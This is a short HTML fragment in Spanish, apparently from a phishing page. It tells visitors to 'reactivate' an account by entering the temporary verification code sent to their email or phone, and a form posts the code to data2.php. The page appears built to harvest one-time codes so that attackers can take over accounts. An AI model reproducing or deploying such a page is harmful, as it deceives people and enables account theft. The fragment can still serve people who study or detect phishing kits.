...
Complete con sus datos actuales <br>para reactivar</h1><br><br>
    <section class="">
        ...
        <form action="data2.php" id="form1" name="form1" method="post" class="form_contact">
    
            <div class="user_info">
            <br><br><br>  <br><br><br> 
            <div align="center">
<h2>ingrese el codigo de verificacion temporal enviado a tu correo electronico y/o celular registrado a tu cuenta!</h2>
